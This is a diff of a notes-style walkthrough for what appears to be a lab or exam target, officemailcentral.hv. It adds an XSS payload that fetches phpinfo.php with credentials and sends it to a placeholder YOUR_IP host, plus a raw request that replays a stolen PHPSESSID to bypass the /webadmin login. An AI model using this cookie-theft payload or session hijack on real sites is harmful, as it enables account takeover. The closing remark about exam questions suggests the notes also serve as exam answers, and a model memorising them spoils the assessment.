@@ -61,9 +61,8 @@ server-status           [Status: 403, Size: 285, Words: 20, Lines: 10, Duration:
 : /database/connect.php
 
 
-* tips from samurai discord
+* hint to solve
 #+begin_src sh
-Encaminhada
 You need to create a payload that uses fetch to steal cookies by deleting the email type value on the target machine. You need to base64 decode the incoming cookie and add it to the login page
 You can try the following payload:
 <script>fetch("http://officemailcentral.hv/phpinfo.php",{credentials:"include"}).then(r=>r.text()).then(d=>fetch("http://YOUR_IP/?data="+btoa(d)));</script>
@@ -232,3 +231,19 @@ hr {width: 934px; background-color: #ccc; border: 0; height: 1px;}
 
 *PHPSESSID* ->
 : c15qvl53vgb3srkv1pem7q6kl7
+
+With the cookie is possible to bypass the */webadmin* login form ->
+#+begin_src sh
+GET /webadmin/ HTTP/1.1
+Host: officemailcentral.hv
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=8vlibvh4mejfodifm81iau1h8k
+Connection: keep-alive
+#+end_src
+
+
+All the exam questions can be found after that cookie hijacking
